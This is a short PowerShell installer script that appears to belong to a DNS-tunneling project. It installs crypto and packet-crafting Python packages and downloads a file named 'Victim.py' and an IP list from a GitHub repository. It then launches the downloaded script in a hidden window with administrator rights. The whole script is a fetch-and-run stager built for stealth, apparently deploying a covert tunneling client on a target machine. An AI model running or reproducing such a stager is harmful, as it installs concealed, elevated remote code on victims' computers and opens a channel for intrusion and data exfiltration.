mkdir C:\scripts
$env:Path += ';C:\scripts'

pip install pyDH
pip install secrets
pip install pycryptodome 
pip install scapy

$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadFile("https://raw.githubusercontent.com/ShacharMarkovich/DNS-Tunneling/main/Victim.py","C:\scripts\v.py")
$WebClient.DownloadFile("https://raw.githubusercontent.com/ShacharMarkovich/DNS-Tunneling/main/ip.txt","C:\scripts\ip.txt")


Powershell -windowstyle hidden -Command "Start-Process python v.py -Verb RunAs"